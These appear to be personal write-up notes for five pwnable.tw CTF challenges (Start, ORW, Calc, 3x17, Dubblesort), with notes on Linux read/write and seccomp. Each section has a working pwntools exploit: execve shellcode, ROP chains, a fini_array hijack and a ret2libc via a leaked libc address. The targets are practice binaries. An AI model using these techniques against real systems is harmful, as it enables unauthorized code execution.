[TOC]



# Start

**Read&Write一些特性**

```
BlockDevice简单理解：系统中能够随机（不需要按顺序）访问固定大小数据片的设备被称作块设备，这些数据片就称作块。特点：单个数据长度大小固定/可随机访问
CharacterDevice简单理解:系统中按照字符流的方式被有序访问，就属于字符设备。特点：单个数据长度不定/必须按照前后顺序访问，类似于流
这里对块设备和字符设备的描述并不十分准确，实际上字符设备也可以被随机访问。真正需要关心的只是操作系统对不同设备抽象出来的接口，以接口的形式去理解才是准确的
ls -l /dev，看到c开头的就是字符设备，看到b开头的就是块设备
tty 命令可以查看当前控制台对应的设备文件  控制台是c字符设备
Fast and Slow Files：https://www.linuxtoday.com/blog/blocking-and-non-blocking-i-0/
快和慢不是只速度的快慢，而是只文件内容是否可预测。能在可预测的时间内响应读写请求的文件速度很快，而执行操作可能需要无限长时间的文件速度很慢。从常规数据文件读取块是可预测的（内核知道数据在那里，它只需要去获取数据），因此常规文件速度很快。但是，从管道读取数据是不可预测的（如果管道为空，内核无法知道何时（如果有的话）将有更多数据放入管道），因此管道是慢文件。
|	File Type	 		|	Category	| 
|	Block device		|	Fast		|
|	Pipe				|	Slow		|
|	Socket				|	Slow		|
|	Regular				|	Fast		|
|	Directory			|	Fast		|
|	Character device	|	Varies		|   字符设备既可能快文件，也可能慢文件。其中的控制台属于慢文件（包含stdin, stdout, stderr）
Read/Write calls will always perform complete operations on fast files, and will return as soon as possible from operations on slow files. 

Case with fast files, you’ll get as many bytes read or written as you requested, or an error returned, except that if you are trying to read past the end of a file--Reading 500 bytes from a 100 byte file will only return 100 bytes, for example.

Case withe slow files, the kernel will return from read() requests as soon as any data is available-- If your application is trying to read 50 bytes of data from a pipe, and only 5 bytes are in that pipe, the kernel will return immediately with those 5 bytes, for example.

By default, read() waits until at least one byte is available to return to the application; this default is called “blocking” mode. Alternatively, individual file descriptors can be switched to “non-blocking” mode, which means that a read() on a slow file will return immediately, even if no bytes are available.

read()  behaves on empty pipes. If nobody has the pipe open for writing, read() will always return 0 bytes and not block. If someone does have the pipe open for writing, though, blocking file descriptors will block onread(), and non-blocking ones will return immediately with EAGAIN. 

Normally, write() will block until it has written all of the data to the file. If you try to write data to a pipe with a full internal buffer, your write() will not return until someone has read enough out of the pipe to make room for all of the data that you’re trying to add. If that particular file descriptor (or file structure) is in non-blocking mode, however, write() will write as much data into the file as it can, and then return. 

Switching a File Descriptor: int fcntl(int fd, int cmd)/ int fcntl(int fd, int cmd, int arg) 可以控制fd的block/nonblock标志

基于上面的总结，描述一些Read、Write的行为：
控制台中，Read 调用在读取到文件结尾（linux Ctrl+D,Win Ctrl+Z + Enter/Return）、\n  任一情况满足时，都会停止读取并返回。
文件结尾时计算读取的字节数不包括文件结束符；
对于\n这种情形，最终读取的数据是（用户输入+\n），返回值为读取的字节数（也是用户输入+\n）；
由于控制台是慢文件，the kernel will return from read() requests as soon as any data is available。文件结尾，\n，时，会将控制台屏幕缓冲区（存在缓冲区的验证方法可以通过输入超出read读取数量的字符，read并没有立马返回，只有在输入了\n或文件结束符时，read才返回）的内容写入stdin，之后read才读取返回（之前read由于fd中没有可读数据，处于阻塞）。
因此，使用pwntools时，利用 tube.send(payload)时，为什么read会只读取输入的payload？因为首先通过socket建立连接，socket属于慢文件，payload在一个数据包中直接发送给目标主机，目标主机接收到数据后，立马从read进行返回。所以，如果一个payload截成两段，分两次p.send，中间再加入一段睡眠时间(不加也没问题，时间足以让kernel认为是两次read)，原本成功的payload就无法被利用了。

Write 写入期待的字节数，遇到\n,\0时不会停止写入,但在受到某些资源限制的时候，真正写入的字节数会小于期待的字节数。

```

![](.\resource\pwnable.tw.Start.png)

**思路**：

```
public _start
_start proc near
push    esp
push    offset _exit
xor     eax, eax
xor     ebx, ebx
xor     ecx, ecx
xor     edx, edx
push    3A465443h
push    20656874h
push    20747261h
push    74732073h
push    2774654Ch
mov     ecx, esp        ; addr
mov     dl, 14h         ; len
mov     bl, 1           ; fd
mov     al, 4
int     80h             ; LINUX - sys_write
xor     ebx, ebx
mov     dl, 3Ch
mov     al, 3
int     80h             ; LINUX - sys_read
add     esp, 14h
retn

1、先write,再read  实际上产生的效果是先Output,再Input
2、一般而言Output用于泄露信息，Input用于产生溢出（用户控制数据）
3、retn  相当于跳转指令，返回到 push offset _exit 这条指令操作对应的栈数据内容，而这个能利用Input进行覆盖，从而控制跳转流程 称为target obj0
4、程序没有开启PIE，因此代码的地址都是固定的；程序没有开启NX，因此可以考虑栈上通过Input注入shellcode执行，为了实现这个目标，必须泄露一个栈地址，并能以这个地址计算出通过Input注入的shellcode地址，一个明显的值就是push esp指令保存的栈地址
5、综合而言,在第一次执行到retn后，程序跳到target obj0位置，并且此时esp指向了push esp对应的地址，这个时候需要将esp处的内容Output，刚好move ecx,esp指令的位置能满足需要，所以target obj0 可以为这个指令的地址，通过PIE性质读取其地址。第二次Output，头四个字节泄露了栈机制，称为 stack base
6、第二次Input的时，利用第二次Output泄露的stack base，Shellcode，生成payload
	Shellcode可以参考漏洞挖掘的艺术进行理解，简单来说就是利用系统调用，执行/bin/sh
	jmp two
	one:
	pop ebx
	<program code>  do execve /bin/sh 系统调用可以参考	https://publicki.top/syscall.html
	two:
	call one
	db 'this is a string'
	优化方面还包括删除空字节、使用栈来构造更小的shellcode、字节码都为可打印字符、多态Shellcode（通过加载程序加/解密Shellcode，影藏Shellcode特征）

7、利用pwntools完成上述过程
```

Writup:

```python
from pwn import *

context(arch='i386',endian='little',os='linux',log_level='debug')

p = process('./start')
# p = remote('chall.pwnable.tw', 10000)


hijack0_addr=0x08048087
payload0 = cyclic(0x14)+p32(hijack0_addr)
p.recvuntil(b':')
p.send(payload0)

leak_stack_addr = u32(p.recv(4))

# 第二次read时，参数中addr的地址
hijack1_base_addr = leak_stack_addr - 4
# len(asm(shellcraft.sh())) = 44 字节，+ 0x14 + 4 = 68 > 0x3C = 60
# 60 - 0x14 - 4 = 36  因此需要找一个36字节长度以下的Shellcode
# shellcode 来源 https://www.exploit-db.com/  25字节
shellcode = b'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80'

hijack1_addr= hijack1_base_addr + 0x14 + 4
payload1 = cyclic(0x14) + p32(hijack1_addr) + shellcode
p.send(payload1)

#测试两次发送同一个payload，能否正常执行
#p.send(payload1[0:0x14])
#import time
#time.sleep(0.1)
#p.send(payload1[0x14:len(payload1)])

p.interactive()
```



# ORW

prctl 测试

```c
#include<stdio.h>
#include<sys/prctl.h>
#include<stdlib.h>
#include<sys/types.h>
#include<unistd.h>
#include<linux/seccomp.h>

int main(){

	//PR_SET_NO_NEW_PRIVS： 0x26（38）
	// Once set,  the  no_new_privs attribute  cannot be unset.  The setting of this attribute is inherited by children created by fork(2) and clone(2), and preserved across execve(2).
	//set-user-ID and set-group-ID mode bits, and file capabilities non-functional（这些不起作用）
	prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
	//PR_SET_SECCOMP:0x16(22)
	//SECCOMP_MODE_STRICT 1
	//SECCOMP_MODE_FILTER 2
	//prctl(PR_SET_SECCOMP,SECCOMP_MODE_STRICT,0,0,0);
	//prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,filter,0,0);
	system("bash");
}
PR_SET_NO_NEW_PRIVS 简单理解就是设置后无法提升权限,新的bash中连sudo这种原合法的提升权限方式都不能使用
PR_SET_SECCOMP SECCOMP_MODE_STRICT:仅可使用read, write, _exit(but not exit_group), and sigreturn
    		   SECCOMP_MODE_FILTER:the system calls allowed are defined by a pointer to a Berkeley Packet Filter passed in arg3
               可以控制允许的系统调用，是一种沙盒开发者使用工具而不是沙盒
               arg3 example:struct sock_fprog prog = {.len = sizeof(filter) / sizeof(filter[0]),.filter = filter,};
								&prog作为arg3传递即可
               Prior to use, the task must call prctl(PR_SET_NO_NEW_PRIVS, 1) or run with CAP_SYS_ADMIN privileges in its namespace.If these are not true, -EACCES will be returned.This requirement ensures that filter programs cannot be applied to child processes with greater privileges than the task that installed them.
     
seccomp-based sandboxes MUST NOT allow use of ptrace, even of other sandboxed processes, without extreme care; ptracers can use this mechanism to escape.
https://www.freebsd.org/cgi/man.cgi?query=bpf&sektion=4&manpath=FreeBSD+4.7-RELEASE
https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt

这里仅仅是限制了能使用的系统调用，题目给出了是open read write 实际结题和prctl并无太大关系
```

checksec

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

Writeup:

```python
from pwn import *

context(arch='i386',endian='little',os='linux',log_level='debug')

io = remote('chall.pwnable.tw', 10001)

shellcode = shellcraft.open('/home/orw/flag')
shellcode += shellcraft.read('eax','esp',100)#open返回值放在eax中是文件描述符，esp是一个存放数据的地方，100是长度
shellcode += shellcraft.write(1,'esp',100)#1是标准输出，esp是输出的数据源，100是长度
shellcode = asm(shellcode)#汇编

io.recvuntil(b':')
io.sendline(shellcode)

io.interactive()

这道题有点问题，本地的orw文件bss并没有执行权限，这份shellcode假设了bss可执行，题目远程环境是可以的，但是本地环境只会出现Process './orw' stopped with exit code -11 (SIGSEGV)  段错误，将orw二进制文件在偏移0xac的位置将0x06改为0x07变成可执行权限，用改过的二进制文件执行就没有问题
```

# Calc

ghidra出bug，无法启动，导致相关的注释都丢了...就简单分析一下吧

```c
void main(void)
{
  signal(0xe,timeout);//信号机制，注册SIGALRM信号处理函数为timeout，timeout方法打印一行字符串并退出
  alarm(0x3c);//60s后向此程序发出SIGALRM信号
  puts("=== Welcome to SECPROG calculator ===");
  fflush((FILE *)stdout);//调用stream底层的write方法强制写
  calc();//关注方法
  puts("Merry Christmas!");
  return;
}

void calc(void)

{
  int iVar1;
  int in_GS_OFFSET;
  int local_5a4;
  undefined4 auStack1440 [100];
  undefined local_410 [1024];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  while( true ) {
    bzero(local_410,0x400);
    //1.不会溢出
    //2.不属于计算字符的直接舍弃，不会读取；相当于限制了输入 0-9+-*/%
    //3.返回值是长度,限制在400，不会溢出
    iVar1 = get_expr(local_410,0x400);
    if (iVar1 == 0) break;
    init_pool(&local_5a4);
    //1.local_410 为400长度的原始表达式
    //2.local_5a4开始可以认为是一个长度为101的int数组，并在init_pool中全初始化为0，即为param2[]=&local_5a4
    //3.local_5a4存放的是param2[1-索引最大]的有效数值个数  比如local_5a4为2，那么param2[1]/param2[2]中有有效数值
    //4.下面printf打印的是param2[local_5a4]的值，可以用于信息泄露
    //5.其中的atoi方法处理空串时会直接返回0,因此用户可以输入+num形式的数据，达到改写param2[0]数值的效果
    //6.如果新的运算符的优先级比之前的还未计算的运算符优先级高，则先放入运算符；否则直接之前的运算符计算并放入param2[*param2]
    //7.到了结尾会自动从后往前计算所有运算符，之后返回结果
    //8.除去上面的简要概述，以及更细节的代码部分，直接给出如下结果：
    //    输入+num，效果：param2[0]=num   接下来就可以泄露param2[num]这个地方的值
    //	  输入+num+/-vnum,效果：param2[num]=param2[num]+/-vnum   结合泄露的值就可以改写任何地址的值
    //9.checksec显示地结果来看比较适合改写got或者rop，但这里明显rop更合适，可以利用ROPgadget进行搜索
    //10.由于parse_expr中会内部操作local_5a4及auStack1440，为了能够利用一段安全的栈空间，不适合将数据直接放在calc的栈中，而是其上一级函数的栈中更合适，而且刚好可以通过计算calc栈中存放的ebp位置来泄露这个值，通过分析栈可以知道这个值为（+num形式泄露对应的num数值）：0x5a4/4=361,所以num要为360（ghidra给出的0x5a4是相对于刚进入calc函数时位置的偏移量，而ebp的位置向下继续要占据4字节，所以num要是360）
    iVar1 = parse_expr(local_410,&local_5a4);
    if (iVar1 != 0) {
      printf("%d\n",auStack1440[local_5a4 + -1]);
      fflush((FILE *)stdout);
    }
  }
  if (local_10 == *(int *)(in_GS_OFFSET + 0x14)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Writeup:

```python
from pwn import *

'''
0x0805c34b : pop eax ; ret
0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
0x08049a21 : int 0x80
32位execve系统调用号11=0xb，execve(&'/bin/sh',0,0)
'''

context(arch='i386',endian='little',os='linux',log_level='debug')

# p = process('./calc')
p = remote('chall.pwnable.tw', 10100)
p.recvuntil('=== Welcome to SECPROG calculator ===\n')
# 读取main函数所用ebp对应的地址，这个地址开始往栈底方向覆盖，就可以覆盖到ip指针，这样在main返回的时候就会出发rop链
p.sendline('+360')
main_ebp = int(p.recvline())
# 依据汇编AND 0xfffffff0  SUB 0x10计算main_ebp_ptr所在的地址
# print(main_ebp)
# print(main_ebp&0xffffffff)
# print(main_ebp&0xfffffff0)
# print(main_ebp&0xffffffff - main_ebp&0xfffffff0)
# print((main_ebp&0xffffffff - main_ebp&0xfffffff0)/4)
# print((((main_ebp&0xffffffff) - (main_ebp&0xfffffff0))/4+4+1+1)*4)
# python转无符号数的时候看上去有点点奇怪，通过&的方式得到,而且&的优先级很低，必须加上括号
# 另外用上除法后，会变成浮点数，末尾加上了.0，那么在str的时候会带上这个.0，所以必须转成int
main_ebp_ptr = main_ebp - (int(((main_ebp&0xffffffff) - (main_ebp&0xfffffff0))/4)+4+1+1)*4
# print(main_ebp_ptr)
# 依据main_ebp_ptr计算出/bin的地址
gadgets = [0x0805c34b,0xb,0x080701d0,0,0,main_ebp_ptr+8*4,0x08049a21,u32('/bin'),u32('/sh\x00')]

for i in range(0,len(gadgets)):
    # 泄漏num对应的param2[num]=oldnum
    p.sendline('+'+str(361+i))
    vnum=gadgets[i]-int(p.recvline())
    # param2[num]=oldnum+vnum 
    if vnum>=0:
        p.sendline('+'+str(361+i)+'+'+str(vnum))
    else:
        # str(vnum)自带减号
        p.sendline('+'+str(361+i)+str(vnum))
    p.recvline() #写操作泄漏的值无需关注

# 用于使main返回触发rop
p.sendline()
p.interactive()


```



# 3x17

主要参考：[和媳妇一起学Pwn 之 3x17 | Clang裁缝店 (xuanxuanblingbling.github.io)](https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/)

补充要点：其中涉及的__libc_csu_init/fini在新版的glibc源码中已经被替换成了call_init和call_fini，并且fini只能在静态链接中使用了（上面参考的文章中看上去是没这个限制的）

鉴于文章的确很好，就不再做过多分析，直接给出WriteUP:

```python
from pwn import *

'''
0x41e4af pop rax ; ret
0x401696 pop rdi ; ret
0x406c30 pop rsi ; ret
0x446e35 pop rdx ; ret
0x4022b4 syscall
64位execve系统调用号59=0x3b，execve(&'/bin/sh',0,0)

'''

context(arch='amd64',endian='little',os='linux',log_level='debug')

# p = process('./3x17')
p = remote('chall.pwnable.tw', 10105)

# 每次data只能最多是24字节
def handle(addr,data):
	p.recvuntil('addr:')
	p.send(str(addr))
	p.recvuntil('data:')
	p.send(data)

fini_array_pos = 0x4B40F0
main_pos = 0x401B6D
fini_pos = 0x402960

handle(fini_array_pos,p64(fini_pos)+p64(main_pos))

# 1.已经能劫持RIP
# 2.虽然没有泄漏栈地址的方法，但可以考虑通过RIP间接劫持栈RSP到已知地址的可写区域，通过栈迁移方式达到想要的数据布局
# 3.构造ROP链

gadget_start_pos = 0x4b4100
binsh_pos = gadget_start_pos + 9*8
# 最后两个0主要是为了方便后面循环处理
gadgets=[0x41e4af,0x3b,0x401696, binsh_pos,0x406c30,0,0x446e35,0,0x4022b4,u64('/bin/sh\x00'),0,0]

for i in range(0,len(gadgets),3):
	handle(gadget_start_pos+i*8,p64(gadgets[i])+p64(gadgets[i+1])+p64(gadgets[i+2]))
# 触发ROP;当ret到一个正常函数的开始处（push rbp;mov rbp,rsp;），这种函数不会破坏栈底部方向的数据，并且在最后leave时栈就平衡了，这时会多出一个ret可以使用，利用这个可以推动ROP的调用
leave_retn_pos = 0x401C4B
handle(fini_array_pos,p64(leave_retn_pos))

p.interactive()
```



# Dubblesort

参考WriteUp：https://cloud.tencent.com/developer/article/1043903

更换本地libc参考方法

* 注意：ld链接器的版本要和glibc的版本要匹配，题目经常会提供glibc，但是自己需要去找到glibc对应版本的ld

* patchelf方式（推荐）：

  ```
  ELF文件本身记录了解释器interpreter位置和库依赖（可以是名称（由interpreter依据名称在相关路径查找）也可以是绝对路径）
  通过patch ELF文件，将ELF文件的interpreter和libc依赖路径进行修改，也可以达到相同的效果
  1.patchelf --set-interpreter /lib/my-ld-linux.so.2 my-program
  2.patchelf --replace-needed liboriginal.so.1 libreplacement.so.1（可以为绝对路径） my-program
  可以参考链接：https://www.cnblogs.com/bhxdn/p/14541441.html
  ```

* pwndbg方式：

  ```python
  # 本质为命令行方式
  export LD_PRELOAD=libc.so(替换成目标libc)
  ld(替换成目标链接器) ./target
  # 程序完成命令行操作
  p=process(["ld","./target"],env={"LD_PRELOAD":"libc.so"})
  #"ld"替换成你需要加载的目标ld，"./target"替换为你需要调试的二进制文件名，"libc.so"替换成你需要加载的目标libc，这样本地调试就可以通过目标libc进行
  虽然可以运行起来程序，但是尝试调用shell时，会无法成功，出现ld相关的问题，不推荐
  ```

* 补充理解

  ![](.\resource\pwnable.tw.dubblesort.png)

  这里可以简单的看出来为什么需要改动ld

* 关闭SIGALRM信号。在gdb输入: handle SIGALRM ignore ，原理是gdb可以拦截被调试进程的所有信号，当然包括SIGALRM，这样调试的时候程序就不会接收到该信号而退出

* 关于栈上泄露地址的理解：有句成语叫做燕过留痕，存在过就可能有痕迹。就正常的程序而言，只要在栈上进行过libc的调用，那么栈上就存在过libc中的地址，如果刚好程序中有类似sub esp,20这种申请内存的方式，刚好涵盖了曾经存放过libc中的地址区域，且在被利用前这段内存没被写过，那么就有机会将这个地址泄露出来，进而进一步利用地址进行攻击。此外，做题的话，题目设计者更是有可能为了方便利用直接将题目做成容易泄露的形式。

Writeup:

```python
from pwn import *

context(arch='i386',endian='little',os='linux',log_level='debug')

# p = process('./dubblesort')
p = remote('chall.pwnable.tw', 10101)
libc = ELF('./libc_32.so.6')

p.sendafter('What your name :', 'k'*0x19)
p.recvuntil('k'*0x19)

leak_addr = u32(b'\x00'+p.recv(3))
# print('lead_addr:',hex(leak_addr))
libc_base_addr = leak_addr - 0x1b0000
# print('system_addr_off:',hex(libc.symbols['system']))
# print('binsh_addr_off',hex(next(libc.search(b'/bin/sh'))))
system_addr = libc_base_addr + libc.symbols['system']
binsh_addr = libc_base_addr + next(libc.search(b'/bin/sh'))
# print('system_addr:',hex(system_addr))
# print('binsh_addr',hex(binsh_addr))

gadgets=[system_addr,binsh_addr,binsh_addr]

p.recvuntil('what to sort :')
p.sendline('35')

def handle_write(data):
	p.recvuntil('number : ')
	p.sendline(data)

for i in range(24):
	handle_write(str(i))
handle_write('+')
# 由于栈中存在esp and操作，所以main其中的填充情况依据gdb调试查看stack中分布得到的结果
# 这是取巧的一种方式，如果需要的话，多次盲尝试应该也能成功
for i in range(7):
	handle_write(str(gadgets[0]))
handle_write(str(gadgets[0]))
handle_write(str(gadgets[1]))
handle_write(str(gadgets[2]))

p.interactive()
```

